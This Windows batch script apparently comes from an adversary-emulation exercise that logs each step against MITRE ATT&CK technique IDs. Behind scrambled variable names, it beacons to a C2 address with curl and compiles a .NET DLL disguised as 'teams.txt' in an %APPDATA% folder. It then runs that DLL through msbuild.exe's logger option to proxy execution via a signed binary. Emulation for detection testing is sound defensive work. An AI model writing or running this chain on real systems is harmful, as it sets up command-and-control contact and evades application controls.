@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\8509\aa713299
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8509-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=teams.txt
SET njozco=file.txt
SET kkjwr=8509

REM Template variables with random names
SET fgyhj=%APPDATA%\%ufeybybm%\macula-simulations.log
SET tyuio=csc.exe
SET ghjkl=%APPDATA%\%ufeybybm%
SET vbnm=msbuild.exe

REM Debug logging: C2 heartbeat start
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: heartbeat_start=initiated>> "%fgyhj%" 2>nul

REM 1. C2 HEARTBEAT (must be the first task before anything else)
curl -k -s -o nul "%uouoq%"

REM Debug logging: C2 heartbeat completion
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: heartbeat_complete=%errorlevel%>> "%fgyhj%" 2>nul

REM 2. Change to output directory
REM Debug logging: directory change start
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: chdir_start=%recnn%>> "%fgyhj%" 2>nul

cd /d "%recnn%"
SET dgfvds=%errorlevel%
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: chdir_complete=%dgfvds%>> "%fgyhj%" 2>nul

REM 3. Compile .NET DLL
REM Debug logging: compilation start
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: compile_start=%njozco%>> "%fgyhj%" 2>nul

"%tyuio%" /target:library /reference:Microsoft.Build.Framework.dll "%njozco%" /out:"%hpnjatpj%"
SET wsfrrt=%errorlevel%
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: compile_complete=%wsfrrt%>> "%fgyhj%" 2>nul

REM TTP logging: T1500 (Compile and Execute .NET DLL)
SET rhcth=%DATE:~10,4%-%DATE:~4,2%-%DATE:~7,2%
SET plkyn=%TIME: =0%
SET plkyn=%plkyn:.=%
SET plkyn=%rhcth% %plkyn:~0,2%:%plkyn:~2,2%:%plkyn:~4,2%.%plkyn:~6,3%
IF %wsfrrt% EQU 0 (SET hfdsr=1) ELSE (SET hfdsr=0)
IF %wsfrrt% EQU 0 (SET gtyhu=) ELSE (SET gtyhu=compile_failed)
echo [%plkyn%][%lqyereup%]: %ufeybybm%-%kkjwr%-T1500|Compile and Execute .NET DLL=%hfdsr%:%gtyhu%>> "%fgyhj%" 2>nul

REM 4. Execute via MSBuild logger
REM Debug logging: process execution start
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: msbuild_start=%vbnm%>> "%fgyhj%" 2>nul

"%vbnm%" /logger:LoggerEntry,"%recnn%\%hpnjatpj%";MyParameters,Foo
SET nmjuy=%errorlevel%
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: msbuild_complete=%nmjuy%>> "%fgyhj%" 2>nul

REM TTP logging: T1218 (Signed Binary Proxy Execution: MSBuild)
SET rhcth=%DATE:~10,4%-%DATE:~4,2%-%DATE:~7,2%
SET plkyn=%TIME: =0%
SET plkyn=%plkyn:.=%
SET plkyn=%rhcth% %plkyn:~0,2%:%plkyn:~2,2%:%plkyn:~4,2%.%plkyn:~6,3%
IF %nmjuy% EQU 0 (SET hfdsr=1) ELSE (SET hfdsr=0)
IF %nmjuy% EQU 0 (SET gtyhu=) ELSE (SET gtyhu=execution_failed)
echo [%plkyn%][%lqyereup%]: %ufeybybm%-%kkjwr%-T1218|Signed Binary Proxy Execution: MSBuild=%hfdsr%:%gtyhu%>> "%fgyhj%" 2>nul

ENDLOCAL